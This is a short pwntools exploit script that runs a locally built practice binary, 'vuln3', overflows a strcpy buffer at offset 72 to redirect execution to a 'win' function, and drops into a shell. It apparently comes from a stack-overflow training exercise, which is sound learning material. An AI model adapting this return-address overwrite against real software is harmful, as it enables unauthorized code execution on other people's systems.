# Exploit for vuln3: Strcpy Stack Overflow (Ret2Win)
from pwn import *
import os

binary_path = os.path.abspath('../build/vuln3')
if len(sys.argv) > 1:
    binary_path = os.path.abspath(sys.argv[1])
elf = ELF(binary_path, checksec=False)
context.binary = elf

log.info("Starting exploit for vuln3 (strcpy -> Ret2Win)...")

win_addr = elf.symbols['win']
log.info(f"Target 'win' address: {hex(win_addr)}")

offset = 72 

payload = flat({
    offset: win_addr
})


p = process(binary_path)
p.sendline(payload)

try:
    
    output = p.recv(timeout=1)
    if b"Spawning shell" in output:
        log.success("Exploit Successful! Shell spawned.")
        p.interactive()

    else:
        log.failure("Exploit Failed. Output: " + output.decode(errors='ignore'))
        
except Exception as e:
    log.failure(f"Error: {e}")

